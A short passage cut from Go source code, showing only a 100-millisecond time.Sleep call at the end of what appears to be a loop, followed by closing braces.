		time.Sleep(100 * time.Millisecond)
	}
}
